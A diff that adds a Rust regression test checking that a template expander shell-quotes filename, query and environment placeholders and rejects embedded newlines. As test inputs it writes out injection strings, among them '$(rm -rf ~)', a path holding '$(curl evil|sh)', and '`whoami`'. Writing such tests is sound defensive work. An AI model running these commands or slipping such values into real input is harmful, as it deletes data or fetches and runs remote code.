@@ -205,6 +205,36 @@ fn print_seam_quotes_and_refuses_hazardous_paths() {
 }
 
 #[test]
+fn print_seam_quotes_every_placeholder_not_just_paths() {
+    // Regression: an attacker-influenced filename / query / env value
+    // must not reach the wrapper's eval unquoted (ADR-003 §2 / ADR-004
+    // §3, revised 2026-07-06 — shadow-review finding).
+    let mut env = HashMap::new();
+    env.insert("EVIL".to_string(), "$(rm -rf ~)".to_string());
+    let path = PathBuf::from("/tmp/$(curl evil|sh)");
+    let ctx = ExpandCtx { path: &path, query: "`whoami`", home: "/home/u", env: &env };
+
+    // {name} — basename can hold shell metacharacters.
+    assert_eq!(
+        t("echo {name}").expand(&ctx, true).unwrap(),
+        "echo '$(curl evil|sh)'"
+    );
+    // {query} — literally user-typed.
+    assert_eq!(t("grep {query}").expand(&ctx, true).unwrap(), "grep '`whoami`'");
+    // {env.*} — data, never a command at this seam.
+    assert_eq!(t("run {env.EVIL}").expand(&ctx, true).unwrap(), "run '$(rm -rf ~)'");
+
+    // Newline in a non-path placeholder is equally hazardous.
+    let mut env2 = HashMap::new();
+    env2.insert("NL".to_string(), "a\nb".to_string());
+    let ctx2 = ExpandCtx { path: &path, query: "", home: "/h", env: &env2 };
+    assert_eq!(
+        t("x {env.NL}").expand(&ctx2, true).unwrap_err(),
+        ExpandError::HazardousPath
+    );
+}
+
+#[test]
 fn undefined_query_is_valid_empty_but_env_is_not() {
     let env = HashMap::new();
     let path = PathBuf::from("/tmp");
